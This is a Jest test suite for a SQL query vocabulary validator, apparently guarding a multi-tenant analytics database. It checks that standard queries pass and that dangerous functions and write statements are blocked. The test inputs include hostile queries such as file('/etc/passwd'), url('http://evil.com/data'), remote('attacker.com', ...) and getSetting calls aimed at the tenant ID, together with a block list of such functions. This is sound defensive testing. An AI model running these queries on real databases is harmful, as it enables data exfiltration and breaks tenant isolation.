import { Parser } from "node-sql-parser";
import {
  validateAstVocabulary,
  extractAllFunctions,
  extractAllOperators,
} from "./hqlVocabularyValidator";
import {
  isAllowedFunction,
  isBlockedFunction,
  isAllowedOperator,
} from "./hqlVocabulary";

const parser = new Parser();

function parseQuery(sql: string) {
  return parser.astify(sql, { database: "Postgresql" });
}

describe("HQL Vocabulary Validator", () => {
  describe("validateAstVocabulary", () => {
    describe("should allow valid queries", () => {
      it("allows basic SELECT with standard aggregates", () => {
        const ast = parseQuery(
          "SELECT COUNT(*), SUM(cost), AVG(latency) FROM request_response_rmt"
        );
        const result = validateAstVocabulary(
          Array.isArray(ast) ? ast[0] : ast
        );
        expect(result.error).toBeNull();
      });

      it("allows date functions", () => {
        const ast = parseQuery(
          "SELECT toStartOfDay(request_created_at), COUNT(*) FROM request_response_rmt GROUP BY 1"
        );
        const result = validateAstVocabulary(
          Array.isArray(ast) ? ast[0] : ast
        );
        expect(result.error).toBeNull();
      });

      it("allows string functions", () => {
        const ast = parseQuery(
          "SELECT LOWER(model), LENGTH(user_id) FROM request_response_rmt"
        );
        const result = validateAstVocabulary(
          Array.isArray(ast) ? ast[0] : ast
        );
        expect(result.error).toBeNull();
      });

      it("allows JSON functions", () => {
        const ast = parseQuery(
          "SELECT JSONExtractString(properties, 'key') FROM request_response_rmt"
        );
        const result = validateAstVocabulary(
          Array.isArray(ast) ? ast[0] : ast
        );
        expect(result.error).toBeNull();
      });

      it("allows conditional functions", () => {
        const ast = parseQuery(
          "SELECT IF(status = 200, 'ok', 'error'), COALESCE(model, 'unknown') FROM request_response_rmt"
        );
        const result = validateAstVocabulary(
          Array.isArray(ast) ? ast[0] : ast
        );
        expect(result.error).toBeNull();
      });

      it("allows window functions", () => {
        const ast = parseQuery(
          "SELECT ROW_NUMBER() OVER (PARTITION BY organization_id ORDER BY request_created_at) FROM request_response_rmt"
        );
        const result = validateAstVocabulary(
          Array.isArray(ast) ? ast[0] : ast
        );
        expect(result.error).toBeNull();
      });

      it("allows type conversion functions", () => {
        const ast = parseQuery(
          "SELECT toString(status), toInt32(latency) FROM request_response_rmt"
        );
        const result = validateAstVocabulary(
          Array.isArray(ast) ? ast[0] : ast
        );
        expect(result.error).toBeNull();
      });

      it("allows math functions", () => {
        const ast = parseQuery(
          "SELECT ABS(cost), ROUND(latency, 2), FLOOR(cost) FROM request_response_rmt"
        );
        const result = validateAstVocabulary(
          Array.isArray(ast) ? ast[0] : ast
        );
        expect(result.error).toBeNull();
      });

      it("allows standard operators", () => {
        const ast = parseQuery(
          "SELECT * FROM request_response_rmt WHERE status = 200 AND latency > 100 OR model LIKE '%gpt%'"
        );
        const result = validateAstVocabulary(
          Array.isArray(ast) ? ast[0] : ast
        );
        expect(result.error).toBeNull();
      });

      it("allows BETWEEN operator", () => {
        const ast = parseQuery(
          "SELECT * FROM request_response_rmt WHERE latency BETWEEN 0 AND 1000"
        );
        const result = validateAstVocabulary(
          Array.isArray(ast) ? ast[0] : ast
        );
        expect(result.error).toBeNull();
      });

      it("allows IN operator", () => {
        const ast = parseQuery(
          "SELECT * FROM request_response_rmt WHERE status IN (200, 201, 204)"
        );
        const result = validateAstVocabulary(
          Array.isArray(ast) ? ast[0] : ast
        );
        expect(result.error).toBeNull();
      });

      it("allows subqueries", () => {
        const ast = parseQuery(
          "SELECT * FROM request_response_rmt WHERE organization_id IN (SELECT DISTINCT organization_id FROM request_response_rmt WHERE status = 500)"
        );
        const result = validateAstVocabulary(
          Array.isArray(ast) ? ast[0] : ast
        );
        expect(result.error).toBeNull();
      });

      it("allows CASE expressions", () => {
        const ast = parseQuery(
          "SELECT CASE WHEN status = 200 THEN 'success' ELSE 'error' END FROM request_response_rmt"
        );
        const result = validateAstVocabulary(
          Array.isArray(ast) ? ast[0] : ast
        );
        expect(result.error).toBeNull();
      });
    });

    describe("should block dangerous functions", () => {
      it("blocks getSetting function", () => {
        const ast = parseQuery(
          "SELECT getSetting('SQL_helicone_organization_id') FROM request_response_rmt"
        );
        const result = validateAstVocabulary(
          Array.isArray(ast) ? ast[0] : ast
        );
        expect(result.error).not.toBeNull();
        expect(result.error?.details).toContain("getSetting");
        expect(result.error?.details).toContain("security-blocked");
      });

      it("blocks file function", () => {
        const ast = parseQuery("SELECT file('/etc/passwd')");
        const result = validateAstVocabulary(
          Array.isArray(ast) ? ast[0] : ast
        );
        expect(result.error).not.toBeNull();
        expect(result.error?.details).toContain("file");
      });

      it("blocks url function", () => {
        const ast = parseQuery("SELECT url('http://evil.com/data')");
        const result = validateAstVocabulary(
          Array.isArray(ast) ? ast[0] : ast
        );
        expect(result.error).not.toBeNull();
        expect(result.error?.details).toContain("url");
      });

      it("blocks s3 function", () => {
        const ast = parseQuery(
          "SELECT s3('https://bucket.s3.amazonaws.com/key')"
        );
        const result = validateAstVocabulary(
          Array.isArray(ast) ? ast[0] : ast
        );
        expect(result.error).not.toBeNull();
        expect(result.error?.details).toContain("s3");
      });

      it("blocks remote function", () => {
        const ast = parseQuery(
          "SELECT remote('attacker.com', 'default', 'table')"
        );
        const result = validateAstVocabulary(
          Array.isArray(ast) ? ast[0] : ast
        );
        expect(result.error).not.toBeNull();
        expect(result.error?.details).toContain("remote");
      });

      it("blocks mysql function", () => {
        const ast = parseQuery(
          "SELECT mysql('localhost', 'db', 'table', 'user', 'pass')"
        );
        const result = validateAstVocabulary(
          Array.isArray(ast) ? ast[0] : ast
        );
        expect(result.error).not.toBeNull();
        expect(result.error?.details).toContain("mysql");
      });

      it("blocks sleep function", () => {
        const ast = parseQuery("SELECT sleep(10)");
        const result = validateAstVocabulary(
          Array.isArray(ast) ? ast[0] : ast
        );
        expect(result.error).not.toBeNull();
        expect(result.error?.details).toContain("sleep");
      });

      it("blocks unknown functions", () => {
        const ast = parseQuery(
          "SELECT unknownDangerousFunction(1) FROM request_response_rmt"
        );
        const result = validateAstVocabulary(
          Array.isArray(ast) ? ast[0] : ast
        );
        expect(result.error).not.toBeNull();
        expect(result.error?.details).toContain("unknownDangerousFunction");
        expect(result.error?.details).toContain("not in allowed function list");
      });
    });

    describe("should block DDL statements", () => {
      it("blocks INSERT statements", () => {
        const ast = parseQuery(
          "INSERT INTO request_response_rmt (request_id) VALUES ('test')"
        );
        const result = validateAstVocabulary(
          Array.isArray(ast) ? ast[0] : ast
        );
        expect(result.error).not.toBeNull();
        expect(result.error?.details).toContain("INSERT");
      });

      it("blocks DELETE statements", () => {
        const ast = parseQuery(
          "DELETE FROM request_response_rmt WHERE request_id = 'test'"
        );
        const result = validateAstVocabulary(
          Array.isArray(ast) ? ast[0] : ast
        );
        expect(result.error).not.toBeNull();
        expect(result.error?.details).toContain("DELETE");
      });

      it("blocks UPDATE statements", () => {
        const ast = parseQuery(
          "UPDATE request_response_rmt SET status = 500 WHERE request_id = 'test'"
        );
        const result = validateAstVocabulary(
          Array.isArray(ast) ? ast[0] : ast
        );
        expect(result.error).not.toBeNull();
        expect(result.error?.details).toContain("UPDATE");
      });
    });
  });

  describe("isAllowedFunction", () => {
    it("returns true for whitelisted functions (case insensitive)", () => {
      expect(isAllowedFunction("count")).toBe(true);
      expect(isAllowedFunction("COUNT")).toBe(true);
      expect(isAllowedFunction("Count")).toBe(true);
      expect(isAllowedFunction("sum")).toBe(true);
      expect(isAllowedFunction("toStartOfDay")).toBe(true);
      expect(isAllowedFunction("JSONExtractString")).toBe(true);
    });

    it("returns false for blocked functions", () => {
      expect(isAllowedFunction("getSetting")).toBe(false);
      expect(isAllowedFunction("file")).toBe(false);
      expect(isAllowedFunction("url")).toBe(false);
      expect(isAllowedFunction("s3")).toBe(false);
      expect(isAllowedFunction("remote")).toBe(false);
      expect(isAllowedFunction("sleep")).toBe(false);
    });

    it("returns false for unknown functions", () => {
      expect(isAllowedFunction("unknownFunc")).toBe(false);
      expect(isAllowedFunction("maliciousFunction")).toBe(false);
    });
  });

  describe("isBlockedFunction", () => {
    it("returns true for explicitly blocked functions", () => {
      expect(isBlockedFunction("getSetting")).toBe(true);
      expect(isBlockedFunction("GETSETTING")).toBe(true);
      expect(isBlockedFunction("file")).toBe(true);
      expect(isBlockedFunction("url")).toBe(true);
      expect(isBlockedFunction("s3")).toBe(true);
      expect(isBlockedFunction("remote")).toBe(true);
      expect(isBlockedFunction("sleep")).toBe(true);
      expect(isBlockedFunction("mysql")).toBe(true);
      expect(isBlockedFunction("postgresql")).toBe(true);
    });

    it("returns false for allowed functions", () => {
      expect(isBlockedFunction("count")).toBe(false);
      expect(isBlockedFunction("sum")).toBe(false);
      expect(isBlockedFunction("toStartOfDay")).toBe(false);
    });
  });

  describe("isAllowedOperator", () => {
    it("returns true for standard comparison operators", () => {
      expect(isAllowedOperator("=")).toBe(true);
      expect(isAllowedOperator("!=")).toBe(true);
      expect(isAllowedOperator("<>")).toBe(true);
      expect(isAllowedOperator("<")).toBe(true);
      expect(isAllowedOperator(">")).toBe(true);
      expect(isAllowedOperator("<=")).toBe(true);
      expect(isAllowedOperator(">=")).toBe(true);
    });

    it("returns true for logical operators", () => {
      expect(isAllowedOperator("AND")).toBe(true);
      expect(isAllowedOperator("OR")).toBe(true);
      expect(isAllowedOperator("NOT")).toBe(true);
    });

    it("returns true for LIKE operators", () => {
      expect(isAllowedOperator("LIKE")).toBe(true);
      expect(isAllowedOperator("NOT LIKE")).toBe(true);
      expect(isAllowedOperator("ILIKE")).toBe(true);
    });

    it("returns true for IN operators", () => {
      expect(isAllowedOperator("IN")).toBe(true);
      expect(isAllowedOperator("NOT IN")).toBe(true);
    });

    it("returns true for BETWEEN", () => {
      expect(isAllowedOperator("BETWEEN")).toBe(true);
    });
  });

  describe("extractAllFunctions", () => {
    it("extracts all functions from a query", () => {
      const ast = parseQuery(
        "SELECT COUNT(*), SUM(cost), toStartOfDay(request_created_at) FROM request_response_rmt"
      );
      const functions = extractAllFunctions(Array.isArray(ast) ? ast[0] : ast);
      expect(functions).toContain("count");
      expect(functions).toContain("sum");
      expect(functions).toContain("tostartofday");
    });

    it("extracts nested functions", () => {
      const ast = parseQuery(
        "SELECT COALESCE(LOWER(model), 'unknown') FROM request_response_rmt"
      );
      const functions = extractAllFunctions(Array.isArray(ast) ? ast[0] : ast);
      expect(functions).toContain("coalesce");
      expect(functions).toContain("lower");
    });
  });

  describe("extractAllOperators", () => {
    it("extracts all operators from a query", () => {
      const ast = parseQuery(
        "SELECT * FROM request_response_rmt WHERE status = 200 AND latency > 100"
      );
      const operators = extractAllOperators(Array.isArray(ast) ? ast[0] : ast);
      expect(operators).toContain("=");
      expect(operators).toContain(">");
      expect(operators).toContain("and");
    });
  });

  describe("Security edge cases", () => {
    it("blocks getSetting even when nested in allowed functions", () => {
      const ast = parseQuery(
        "SELECT COALESCE(getSetting('key'), 'default') FROM request_response_rmt"
      );
      const result = validateAstVocabulary(Array.isArray(ast) ? ast[0] : ast);
      expect(result.error).not.toBeNull();
      expect(result.error?.details).toContain("getSetting");
    });

    it("blocks dangerous functions in subqueries", () => {
      const ast = parseQuery(
        "SELECT * FROM request_response_rmt WHERE organization_id IN (SELECT getSetting('key'))"
      );
      const result = validateAstVocabulary(Array.isArray(ast) ? ast[0] : ast);
      expect(result.error).not.toBeNull();
      expect(result.error?.details).toContain("getSetting");
    });

    it("blocks dangerous functions in CASE expressions", () => {
      const ast = parseQuery(
        "SELECT CASE WHEN getSetting('key') = 'value' THEN 1 ELSE 0 END FROM request_response_rmt"
      );
      const result = validateAstVocabulary(Array.isArray(ast) ? ast[0] : ast);
      expect(result.error).not.toBeNull();
      expect(result.error?.details).toContain("getSetting");
    });

    it("validates functions case-insensitively", () => {
      // getSetting should be blocked regardless of case
      const ast1 = parseQuery("SELECT GETSETTING('key')");
      const result1 = validateAstVocabulary(Array.isArray(ast1) ? ast1[0] : ast1);
      expect(result1.error).not.toBeNull();

      const ast2 = parseQuery("SELECT GetSetting('key')");
      const result2 = validateAstVocabulary(Array.isArray(ast2) ? ast2[0] : ast2);
      expect(result2.error).not.toBeNull();
    });
  });
});
